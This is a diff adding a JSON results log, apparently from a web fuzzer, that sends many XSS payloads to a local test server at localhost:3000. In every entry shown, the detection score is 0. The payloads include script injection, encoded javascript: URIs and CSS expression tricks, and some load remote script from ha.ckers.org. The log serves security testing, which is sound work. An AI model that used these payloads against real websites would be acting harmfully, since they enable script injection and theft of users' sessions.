@@ -1,0 +1,1170 @@
+[
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSCRIPT\u003Ealert(\u0027XSS\u0027);\u003C/SCRIPT\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 15,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=\u0060javascript:alert(\u0022RSnake says, \u0027XSS\u0027\u0022)\u0060\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 282,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSCRIPT SRC=http://ha.ckers.org/xss.js\u003E\u003C/SCRIPT\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 283,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=javascript:alert(\u0026quot;XSS\u0026quot;)\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 283,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=javascript:alert(\u0027XSS\u0027)\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 283,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CLINK REL=\u0022stylesheet\u0022 HREF=\u0022javascript:alert(\u0027XSS\u0027);\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 284,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=\u0026#x6A\u0026#x61\u0026#x76\u0026#x61\u0026#x73\u0026#x63\u0026#x72\u0026#x69\u0026#x70\u0026#x74\u0026#x3A\u0026#x61\u0026#x6C\u0026#x65\u0026#x72\u0026#x74\u0026#x28\u0026#x27\u0026#x58\u0026#x53\u0026#x53\u0026#x27\u0026#x29\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 284,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CMETA HTTP-EQUIV=\u0022Link\u0022 Content=\u0022\u003Chttp://ha.ckers.org/xss.css\u003E; REL=stylesheet\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 285,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CLINK REL=\u0022stylesheet\u0022 HREF=\u0022http://ha.ckers.org/xss.css\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 285,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CINPUT TYPE=\u0022IMAGE\u0022 SRC=\u0022javascript:alert(\u0027XSS\u0027);\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 286,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=javascript:alert(String.fromCharCode(88,83,83))\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 287,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=JaVaScRiPt:alert(\u0027XSS\u0027)\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 288,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSCRIPT SRC=http://ha.ckers.org/xss.js?\u003CB\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 288,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "SRC=\u0026#10\u003CIMG 6;\u0026#97;\u0026#118;\u0026#97;\u0026#115;\u0026#99;\u0026#114;\u0026#105;\u0026#112;\u0026#116;\u0026#58;\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116;\u0026#40;\u0026#39;\u0026#88;\u0026#83;\u0026#83;\u0026#39;\u0026#41;\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 288,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=\u0022jav\u0026#x0A;ascript:alert(\u0027XSS\u0027);\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 289,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CBODY BACKGROUND=\u0022javascript:alert(\u0027XSS\u0027)\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 298,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\\\u0022;alert(\u0027XSS\u0027);//",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 299,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=\u0022jav\u0026#x09;ascript:alert(\u0027XSS\u0027);\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 299,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=\u0026#0000106\u0026#0000097\u0026#0000118\u0026#0000097\u0026#0000115\u0026#0000099\u0026#0000114\u0026#0000105\u0026#0000112\u0026#0000116\u0026#0000058\u0026#0000097\u0026#0000108\u0026#0000101\u0026#0000114\u0026#0000116\u0026#0000040\u0026#0000039\u0026#0000088\u0026#0000083\u0026#0000083\u0026#0000039\u0026#0000041\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 303,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CBGSOUND SRC=\u0022javascript:alert(\u0027XSS\u0027);\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 304,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u0027\u0027;!--\u0022\u003CXSS\u003E=\u0026{()}",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 304,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=\u0022jav\u0026#x0D;ascript:alert(\u0027XSS\u0027);\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 304,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=\u0022javascript:alert(\u0027XSS\u0027)\u0022",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 305,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CBR SIZE=\u0022\u0026{alert(\u0027XSS\u0027)}\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 305,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSCRIPT/XSS SRC=\u0022http://ha.ckers.org/xss.js\u0022\u003E\u003C/SCRIPT\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 305,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSCRIPT\u003Ea=/XSS/",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 305,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSTYLE\u003E@import\u0027http://ha.ckers.org/xss.css\u0027;\u003C/STYLE\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 305,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=\u0022jav\tascript:alert(\u0027XSS\u0027);\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 306,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CLAYER SRC=\u0022http://ha.ckers.org/scriptlet.html\u0022\u003E\u003C/LAYER\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 306,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CBODY ONLOAD=alert(\u0027XSS\u0027)\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 307,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSTYLE\u003EBODY{-moz-binding:url(\u0022http://ha.ckers.org/xssmoz.xml#xss\u0022)}\u003C/STYLE\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 307,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=\u0027vbscript:msgbox(\u0022XSS\u0022)\u0027\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 307,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=\u0022javascript:alert(\u0027XSS\u0027);\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 308,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=\u0022livescript:[code]\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 308,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CMETA HTTP-EQUIV=\u0022refresh\u0022 CONTENT=\u00220;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 314,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=\u0022mocha:[code]\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 314,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG LOWSRC=\u0022javascript:alert(\u0027XSS\u0027)\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 314,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG DYNSRC=\u0022javascript:alert(\u0027XSS\u0027)\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 314,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CMETA HTTP-EQUIV=\u0022refresh\u0022 CONTENT=\u00220;url=javascript:alert(\u0027XSS\u0027);\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 314,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG SRC=\u0022 \u0026#14;  javascript:alert(\u0027XSS\u0027);\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 315,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CMETA HTTP-EQUIV=\u0022Link\u0022 Content=\u0022\u003Cjavascript:alert(\u0027XSS\u0027)\u003E; REL=stylesheet\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 299,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CMETA HTTP-EQUIV=\u0022refresh\u0022 CONTENT=\u00220; URL=http://;URL=javascript:alert(\u0027XSS\u0027);\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 33,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIFRAME SRC=\u0022javascript:alert(\u0027XSS\u0027);\u0022\u003E\u003C/IFRAME\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 32,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CFRAMESET\u003E\u003CFRAME SRC=\u0022javascript:alert(\u0027XSS\u0027);\u0022\u003E\u003C/FRAMESET\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 33,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CTABLE BACKGROUND=\u0022javascript:alert(\u0027XSS\u0027)\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 33,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CDIV STYLE=\u0022background-image: url(javascript:alert(\u0027XSS\u0027))\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 32,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CDIV STYLE=\u0022background-image: url(\u0026#1;javascript:alert(\u0027XSS\u0027))\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 32,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CDIV STYLE=\u0022width: expression(alert(\u0027XSS\u0027));\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 32,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSTYLE\u003E@im\\port\u0027\\ja\\vasc\\ript:alert(\u0022XSS\u0022)\u0027;\u003C/STYLE\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 31,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CIMG STYLE=\u0022xss:expr/*XSS*/ession(alert(\u0027XSS\u0027))\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 30,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CXSS STYLE=\u0022xss:expression(alert(\u0027XSS\u0027))\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 30,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "exp/*\u003CXSS STYLE=\u0027no\\xss:noxss(\u0022*//*\u0022);",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 30,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSTYLE TYPE=\u0022text/javascript\u0022\u003Ealert(\u0027XSS\u0027);\u003C/STYLE\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 30,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSTYLE\u003E.XSS{background-image:url(\u0022javascript:alert(\u0027XSS\u0027)\u0022);}\u003C/STYLE\u003E\u003CA CLASS=XSS\u003E\u003C/A\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 30,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CBASE HREF=\u0022javascript:alert(\u0027XSS\u0027);//\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 20,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSTYLE type=\u0022text/css\u0022\u003EBODY{background:url(\u0022javascript:alert(\u0027XSS\u0027)\u0022)}\u003C/STYLE\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 21,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003COBJECT TYPE=\u0022text/x-scriptlet\u0022 DATA=\u0022http://ha.ckers.org/scriptlet.html\u0022\u003E\u003C/OBJECT\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 30,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003COBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389\u003E\u003Cparam name=url value=javascript:alert(\u0027XSS\u0027)\u003E\u003C/OBJECT\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 26,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "getURL(\u0022javascript:alert(\u0027XSS\u0027)\u0022)",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 25,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "a=\u0022get\u0022;",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 25,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003C!--\u003Cvalue\u003E\u003C![CDATA[\u003CXML ID=I\u003E\u003CX\u003E\u003CC\u003E\u003C![CDATA[\u003CIMG SRC=\u0022javas\u003C![CDATA[cript:alert(\u0027XSS\u0027);\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 25,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CXML SRC=\u0022http://ha.ckers.org/xsstest.xml\u0022 ID=I\u003E\u003C/XML\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 25,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CHTML\u003E\u003CBODY\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 25,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSCRIPT SRC=\u0022http://ha.ckers.org/xss.jpg\u0022\u003E\u003C/SCRIPT\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 25,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003C!--#exec cmd=\u0022/bin/echo \u0027\u003CSCRIPT SRC\u0027\u0022--\u003E\u003C!--#exec cmd=\u0022/bin/echo \u0027=http://ha.ckers.org/xss.js\u003E\u003C/SCRIPT\u003E\u0027\u0022--\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 25,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003C? echo(\u0027\u003CSCR)\u0027;",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 25,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
